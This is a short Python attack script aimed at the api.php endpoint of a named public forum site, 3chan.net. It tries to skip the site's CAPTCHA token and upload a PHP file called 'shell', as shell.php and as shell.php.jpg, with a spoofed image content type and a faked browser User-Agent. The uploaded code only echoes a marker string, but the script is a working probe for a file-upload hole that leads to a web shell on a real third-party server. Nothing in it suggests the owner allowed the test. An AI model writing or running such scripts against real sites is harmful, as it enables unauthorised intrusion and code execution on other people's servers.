#!/usr/bin/env python3
"""3chan api.php - test direct upload WITHOUT turnstile token
POST action=post_thread + image=shell
"""
import urllib.request, urllib.parse, uuid

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

SHELL = b'<?php echo "SHELL_3CHAN_271828"; ?>'

def upload(url, filename, content, ctype):
    boundary = uuid.uuid4().hex
    body = b""
    for k, v in [("action", "post_thread"), ("board", "b"), ("name", "t"),
                 ("email", ""), ("comment", "test post")]:
        body += b"--" + boundary.encode() + b"\r\n"
        body += ('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode()
        body += v.encode() + b"\r\n"
    # file
    body += b"--" + boundary.encode() + b"\r\n"
    body += ('Content-Disposition: form-data; name="image"; filename="%s"\r\n' % filename).encode()
    body += ('Content-Type: %s\r\n\r\n' % ctype).encode()
    body += content + b"\r\n"
    body += b"--" + boundary.encode() + b"--\r\n"
    h = {**UA, "Content-Type": "multipart/form-data; boundary=" + boundary}
    req = urllib.request.Request(url, data=body, headers=h)
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return r.status, r.read(5000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)[:100]

# 1. upload php directly
print("=== upload shell.php ===", flush=True)
code, resp = upload("http://3chan.net/api.php", "shell.php", SHELL, "image/jpeg")
print("code=%s resp=%s" % (code, resp[:300]), flush=True)

# 2. upload with .php.jpg double ext
print("\n=== upload shell.php.jpg ===", flush=True)
code, resp = upload("http://3chan.net/api.php", "shell.php.jpg", SHELL, "image/jpeg")
print("code=%s resp=%s" % (code, resp[:300]), flush=True)
